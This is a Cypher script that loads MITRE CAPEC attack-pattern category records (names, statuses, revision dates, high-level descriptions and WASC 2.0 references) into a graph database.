CREATE (:Category{id: 118, name: "Collect and Analyze Information", status: "Stable"});
CREATE (:Submission{id: 1});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 1});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:PreviousEntryName{id: 1, name: "Gather Information"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 1, summary: "Attack patterns within this category focus on the gathering, collection, and theft of information by an adversary. The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary."});
CREATE (:Category{id: 119, name: "DEPRECATED: Deplete Resources", status: "Deprecated"});
CREATE (:Submission{id: 2});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 2});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 3});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description, Related_Weaknesses, Resources_Required"});
CREATE (:PreviousEntryName{id: 2, name: "Deplete Resources"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 2, summary: "This category has been deprecated as it is no longer used by any of the Views."});
CREATE (:Category{id: 152, name: "Inject Unexpected Items", status: "Stable"});
CREATE (:Submission{id: 3});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 4});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 5});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:Modification{id: 6});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:PreviousEntryName{id: 3, name: "Injection"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 3, summary: "Attack patterns within this category focus on the ability to control or disrupt the behavior of an target either through crafted data submitted via an interface for data input, or the installation and execution of malicious code on the target system. The former happens when an adversary adds material to their input that is interpreted by the application causing the targeted application to perform steps unintended by the application manager or causing the application to enter an unstable state. Attacks of this type differ from Data Structure Attacks in that the latter attacks subvert the underlying structures that hold user-provided data, either pre-empting interpretation of the input (in the case of Buffer Overflows) or resulting in values that the targeted application is unable to handle correctly (in the case of Integer Overflows). In Injection attacks, the input is interpreted by the application, but the attacker has included instructions to the interpreting functions that the target application then follows."});
CREATE (:Category{id: 156, name: "Engage in Deceptive Interactions", status: "Stable"});
CREATE (:Submission{id: 4});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 7});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 8});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:PreviousEntryName{id: 4, name: "Deceptive Interactions"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 4, summary: "Attack patterns within this category focus on malicious interactions with a target in an attempt to deceive the target and convince the target that it is interacting with some other principal and as such take actions based on the level of trust that exists between the target and the other principal. These types of attacks assume that some piece of content or functionality is associated with an identity and that the content / functionality is trusted by the target because of this association. Often identified by the term \"spoofing\", these types of attacks rely on the falsification of the content and/or identity in such a way that the target will incorrectly trust the legitimacy of the content. For example, an attacker may modify a financial transaction between two parties so that the participants remain unchanged but the amount of the transaction is increased. If the recipient cannot detect the change, they may incorrectly assume the modified message originated with the original sender. Attacks of these type may involve an adversary crafting the content from scratch or capturing and modifying legitimate content."});
CREATE (:Category{id: 172, name: "Manipulate Timing and State", status: "Stable"});
CREATE (:AttackPrerequisite{id: 1, text: "<div level=\"0\">\n  <p class=\"text\">Virtually all applications can be subject to time or state attacks in some form.</p>\n</div>"});
CREATE (:Submission{id: 5});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 9});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 5, summary: "An attacker exploits weaknesses in timing or state maintaining functions to perform actions that would otherwise be prevented by the execution flow of the target code and processes. An example of a state attack might include manipulation of an application's information to change the apparent credentials or similar information, possibly allowing the application to access material it would not normally be allowed to access. A common example of a timing attack is a test-action race condition where some state information is tested and, if it passes, an action is performed. If the attacker can change the state between the time that the application performs the test and the time the action is performed, then they might be able to manipulate the outcome of the action to malicious ends."});
MERGE (:CWE{id: 665});
CREATE (:ResourcesRequired{id: 1, text: "<div level=\"0\">\n  <p class=\"text\">State attacks require the ability to manipulate the underlying state of an application. If that state is stored in a simple file, this can be relatively easy. If the state is stored internally, this can be more difficult. Timing attacks rely on being able to control when an application's thread is interrupted in order to insert the malicious action. Even then, if the actions in the sequence happen quickly, then success can largely be a matter of luck. As such, having many opportunities to attempt the attack is usually a requirement since and individual attack may have a low probability of success.</p>\n</div>"});
CREATE (:Category{id: 210, name: "Abuse Existing Functionality", status: "Stable"});
CREATE (:Submission{id: 6});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 10});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 11});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description, Relationships, Resources_Required"});
CREATE (:Modification{id: 12});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:PreviousEntryName{id: 5, name: "Abuse of Functionality"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 6, summary: "An adversary uses or manipulates one or more functions of an application in order to achieve a malicious objective not originally intended by the application, or to deplete a resource to the point that the target's functionality is affected. This is a broad class of attacks wherein the adversary is able to alter the intended result or purpose of the functionality and thereby affect application behavior or information integrity. Outcomes can range from information exposure, vandalism, degrading or denial of service, as well as execution of arbitrary code on the target machine."});
CREATE (:Category{id: 223, name: "Employ Probabilistic Techniques", status: "Stable"});
CREATE (:Submission{id: 7});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 13});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:PreviousEntryName{id: 6, name: "Probabilistic Techniques"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 7, summary: "An attacker utilizes probabilistic techniques to explore and overcome security properties of the target that are based on an assumption of strength due to the extremely low mathematical probability that an attacker would be able to identify and exploit the very rare specific conditions under which those security properties do not hold."});
CREATE (:Category{id: 225, name: "Subvert Access Control", status: "Stable"});
CREATE (:Submission{id: 8});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 14});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 15});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:PreviousEntryName{id: 7, name: "Exploitation of Authentication"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 8, summary: "An attacker actively targets exploitation of weaknesses, limitations and assumptions in the mechanisms a target utilizes to manage identity and authentication as well as manage access to its resources or authorize functionality. Such exploitation can lead to the complete subversion of any trust the target system may have in the identity of any entity with which it interacts, or the complete subversion of any control the target has over its data or functionality. Weaknesses targeted by subversion of authentication mechanisms are often due to assumptions and overconfidence in the strength or rigor of the implemented authentication mechanisms. Weaknesses targeted by subversion of authorization controls are often due to three primary factors: 1) a fundamental dependence on authentication mechanisms being effective; 2) a lack of effective control over the separation of privilege between various entities; and 3) assumptions and over confidence in the strength or rigor of the implemented authorization mechanisms."});
MERGE (:CWE{id: 306});
CREATE (:Category{id: 232, name: "DEPRECATED: Exploitation of Authorization", status: "Deprecated"});
CREATE (:Submission{id: 9});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 16});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Weaknesses, Relationships"});
CREATE (:Modification{id: 17});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 18});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description"});
CREATE (:PreviousEntryName{id: 8, name: "Exploitation of Authorization"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 9, summary: "This category has been deprecated as it is no longer used by any of the Views."});
CREATE (:Category{id: 255, name: "Manipulate Data Structures", status: "Stable"});
CREATE (:Submission{id: 10});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 19});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:Description{id: 10, summary: "Attack patterns in this category manipulate and exploit characteristics of system data structures in order to violate the intended usage and protections of these structures. This is done in such a way that yields either improper access to the associated system data or violations of the security properties of the system itself due to vulnerabilities in how the system processes and manages the data structures. Often, vulnerabilities and therefore exploitability of these data structures exist due to ambiguity and assumption in their design and prescribed handling."});
CREATE (:Category{id: 262, name: "Manipulate System Resources", status: "Stable"});
CREATE (:Submission{id: 11});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 20});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 21});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description, Relationships"});
CREATE (:PreviousEntryName{id: 9, name: "Manipulate Resources"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 11, summary: "Attack patterns within this category focus on the adversary's ability to manipulate one or more resources in order to achieve a desired outcome. This is a broad class of attacks wherein the attacker is able to change some aspect of a resource's state or availability and thereby affect system behavior or information integrity. Examples of resources include files, applications, libraries, infrastructure, and configuration information. Outcomes can range from vandalism and reduction in service to the execution of arbitrary code on the target machine."});
CREATE (:Category{id: 281, name: "DEPRECATED: Analyze Target", status: "Deprecated"});
CREATE (:Submission{id: 12});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 22});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 23});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 24});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description, Other_Notes"});
CREATE (:PreviousEntryName{id: 10, name: "Analyze Target"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 12, summary: "This category has been deprecated as it is no longer used in any view."});
CREATE (:Category{id: 286, name: "DEPRECATED: Reconnaissance", status: "Deprecated"});
CREATE (:Submission{id: 13});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 25});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Modification{id: 26});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Description"});
CREATE (:PreviousEntryName{id: 11, name: "Reconnaissance"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 13, summary: "This category has been deprecated as it is no longer used in any view."});
CREATE (:Category{id: 334, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-01 - Insufficient Authentication", status: "Deprecated"});
CREATE (:Submission{id: 14});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 14, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Authentication"});
MERGE (:Reference{id: "REF-1", local_id: "R.334.1", title: "WASC Threat Classification 2.0", section: "WASC-01 - Insufficient Authentication", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient-Authentication"});
CREATE (:Category{id: 335, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-02 - Insufficient Authorization", status: "Deprecated"});
CREATE (:Submission{id: 15});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 15, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Authorization"});
MERGE (:Reference{id: "REF-1", local_id: "R.335.1", title: "WASC Threat Classification 2.0", section: "WASC-02 - Insufficient Authorization", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient-Authorization"});
CREATE (:Category{id: 336, name: "WASC-03 - Integer Overflows", status: "Draft"});
CREATE (:Submission{id: 16});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 16, summary: "This category is related to the WASC Threat Classification 2.0 item Integer Overflows"});
MERGE (:Reference{id: "REF-1", local_id: "R.336.1", title: "WASC Threat Classification 2.0", section: "WASC-03 - Integer Overflows", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Integer-Overflows"});
CREATE (:Category{id: 337, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-04 - Insufficient Transport Layer Protection", status: "Deprecated"});
CREATE (:Submission{id: 17});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 17, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Transport Layer Protection"});
MERGE (:Reference{id: "REF-1", local_id: "R.337.1", title: "WASC Threat Classification 2.0", section: "WASC-04 - Insufficient Transport Layer Protection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient-Transport-Layer-Protection"});
CREATE (:Category{id: 338, name: "WASC-05 - Remote File Inclusion", status: "Draft"});
CREATE (:Submission{id: 18});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 18, summary: "This category is related to the WASC Threat Classification 2.0 item Remote File Inclusion"});
MERGE (:Reference{id: "REF-1", local_id: "R.338.1", title: "WASC Threat Classification 2.0", section: "WASC-05 - Remote File Inclusion", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Remote-File-Inclusion"});
CREATE (:Category{id: 339, name: "WASC-06 - Format String", status: "Draft"});
CREATE (:Submission{id: 19});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 27});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 19, summary: "This category is related to the WASC Threat Classification 2.0 item Format String"});
MERGE (:Reference{id: "REF-1", local_id: "R.339.1", title: "WASC Threat Classification 2.0", section: "WASC-06 - Format String", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Format-String"});
CREATE (:Category{id: 340, name: "WASC-07 - Buffer Overflow", status: "Draft"});
CREATE (:Submission{id: 20});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 28});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 20, summary: "This category is related to the WASC Threat Classification 2.0 item Buffer Overflow"});
MERGE (:Reference{id: "REF-1", local_id: "R.340.1", title: "WASC Threat Classification 2.0", section: "WASC-07 - Buffer Overflow", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Buffer-Overflow"});
CREATE (:Category{id: 341, name: "WASC-08 - Cross-Site Scripting", status: "Draft"});
CREATE (:Submission{id: 21});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 29});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 21, summary: "This category is related to the WASC Threat Classification 2.0 item Cross-Site Scripting"});
MERGE (:Reference{id: "REF-1", local_id: "R.341.1", title: "WASC Threat Classification 2.0", section: "WASC-08 - Cross-Site Scripting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Cross-Site-Scripting"});
CREATE (:Category{id: 342, name: "WASC-09 - Cross-Site Request Forgery", status: "Draft"});
CREATE (:Submission{id: 22});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 22, summary: "This category is related to the WASC Threat Classification 2.0 item Cross-Site Request Forgery"});
MERGE (:Reference{id: "REF-1", local_id: "R.342.1", title: "WASC Threat Classification 2.0", section: "WASC-09 - Cross-Site Request Forgery", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Cross-Site-Request-Forgery"});
CREATE (:Category{id: 343, name: "WASC-10 - Denial of Service", status: "Draft"});
CREATE (:Submission{id: 23});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 30});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Relationships"});
CREATE (:Description{id: 23, summary: "This category is related to the WASC Threat Classification 2.0 item Denial of Service"});
MERGE (:Reference{id: "REF-1", local_id: "R.343.1", title: "WASC Threat Classification 2.0", section: "WASC-10 - Denial of Service", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Denial-of-Service"});
CREATE (:Category{id: 344, name: "WASC-11 - Brute Force", status: "Draft"});
CREATE (:Submission{id: 24});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 24, summary: "This category is related to the WASC Threat Classification 2.0 item Brute Force"});
MERGE (:Reference{id: "REF-1", local_id: "R.344.1", title: "WASC Threat Classification 2.0", section: "WASC-11 - Brute Force", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Brute-Force"});
CREATE (:Category{id: 345, name: "WASC-12 - Content Spoofing", status: "Draft"});
CREATE (:Submission{id: 25});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 25, summary: "This category is related to the WASC Threat Classification 2.0 item Content Spoofing"});
MERGE (:Reference{id: "REF-1", local_id: "R.345.1", title: "WASC Threat Classification 2.0", section: "WASC-12 - Content Spoofing", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Content-Spoofing"});
CREATE (:Category{id: 346, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-13 - Information Leakage", status: "Deprecated"});
CREATE (:Submission{id: 26});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 26, summary: "This category is related to the WASC Threat Classification 2.0 item Information Leakage"});
MERGE (:Reference{id: "REF-1", local_id: "R.346.1", title: "WASC Threat Classification 2.0", section: "WASC-13 - Information Leakage", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Information-Leakage"});
CREATE (:Category{id: 347, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-14 - Server Misconfiguration", status: "Deprecated"});
CREATE (:Submission{id: 27});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 27, summary: "This category is related to the WASC Threat Classification 2.0 item Server Misconfiguration"});
MERGE (:Reference{id: "REF-1", local_id: "R.347.1", title: "WASC Threat Classification 2.0", section: "WASC-14 - Server Misconfiguration", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Server-Misconfiguration"});
CREATE (:Category{id: 348, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-15 - Application Misconfiguration", status: "Deprecated"});
CREATE (:Submission{id: 28});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 28, summary: "This category is related to the WASC Threat Classification 2.0 item Application Misconfiguration"});
MERGE (:Reference{id: "REF-1", local_id: "R.348.1", title: "WASC Threat Classification 2.0", section: "WASC-15 - Application Misconfiguration", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Application-Misconfiguration"});
CREATE (:Category{id: 349, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-16 - Directory Indexing", status: "Deprecated"});
CREATE (:Submission{id: 29});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 29, summary: "This category is related to the WASC Threat Classification 2.0 item Directory Indexing"});
MERGE (:Reference{id: "REF-1", local_id: "R.349.1", title: "WASC Threat Classification 2.0", section: "WASC-16 - Directory Indexing", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Directory-Indexing"});
CREATE (:Category{id: 350, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-17 - Improper Filesystem Permissions", status: "Deprecated"});
CREATE (:Submission{id: 30});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 30, summary: "This category is related to the WASC Threat Classification 2.0 item Improper Filesystem Permissions"});
MERGE (:Reference{id: "REF-1", local_id: "R.350.1", title: "WASC Threat Classification 2.0", section: "WASC-17 - Improper Filesystem Permissions", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Improper-Filesystem-Permissions"});
CREATE (:Category{id: 351, name: "WASC-18 - Credential/Session Prediction", status: "Draft"});
CREATE (:Submission{id: 31});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 31, summary: "This category is related to the WASC Threat Classification 2.0 item Credential/Session Prediction"});
MERGE (:Reference{id: "REF-1", local_id: "R.351.1", title: "WASC Threat Classification 2.0", section: "WASC-18 - Credential/Session Prediction", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Credential-and-Session-Prediction"});
CREATE (:Category{id: 352, name: "WASC-19 - SQL Injection", status: "Draft"});
CREATE (:Submission{id: 32});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 32, summary: "This category is related to the WASC Threat Classification 2.0 item SQL Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.352.1", title: "WASC Threat Classification 2.0", section: "WASC-19 - SQL Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/SQL-Injection"});
CREATE (:Category{id: 353, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-20 - Improper Input Handling", status: "Deprecated"});
CREATE (:Submission{id: 33});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 33, summary: "This category is related to the WASC Threat Classification 2.0 item Improper Input Handling"});
MERGE (:Reference{id: "REF-1", local_id: "R.353.1", title: "WASC Threat Classification 2.0", section: "WASC-20 - Improper Input Handling", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Improper-Input-Handling"});
CREATE (:Category{id: 354, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-21 - Insufficient Anti-automation", status: "Deprecated"});
CREATE (:Submission{id: 34});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 34, summary: "This category is related to the WASC Threat Classification 2.0 item Insufficient Anti-automation"});
MERGE (:Reference{id: "REF-1", local_id: "R.354.1", title: "WASC Threat Classification 2.0", section: "WASC-21 - Insufficient Anti-automation", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Insufficient+Anti-automation"});
CREATE (:Category{id: 355, name: "DEPRECATED: WASC Threat Classification 2.0 - WASC-22 - Improper Output Handling", status: "Deprecated"});
CREATE (:Submission{id: 35});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 35, summary: "This category is related to the WASC Threat Classification 2.0 item Improper Output Handling"});
MERGE (:Reference{id: "REF-1", local_id: "R.355.1", title: "WASC Threat Classification 2.0", section: "WASC-22 - Improper Output Handling", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/Improper-Output-Handling"});
CREATE (:Category{id: 356, name: "WASC-23 - XML Injection", status: "Draft"});
CREATE (:Submission{id: 36});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 36, summary: "This category is related to the WASC Threat Classification 2.0 item XML Injection"});
MERGE (:Reference{id: "REF-1", local_id: "R.356.1", title: "WASC Threat Classification 2.0", section: "WASC-23 - XML Injection", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/XML-Injection"});
CREATE (:Category{id: 357, name: "WASC-24 - HTTP Request Splitting", status: "Draft"});
CREATE (:Submission{id: 37});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 37, summary: "This category is related to the WASC Threat Classification 2.0 item HTTP Request Splitting"});
MERGE (:Reference{id: "REF-1", local_id: "R.357.1", title: "WASC Threat Classification 2.0", section: "WASC-24 - HTTP Request Splitting", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/HTTP-Request-Splitting"});
CREATE (:Category{id: 358, name: "WASC-25 - HTTP Response Splitting", status: "Draft"});
CREATE (:Submission{id: 38});
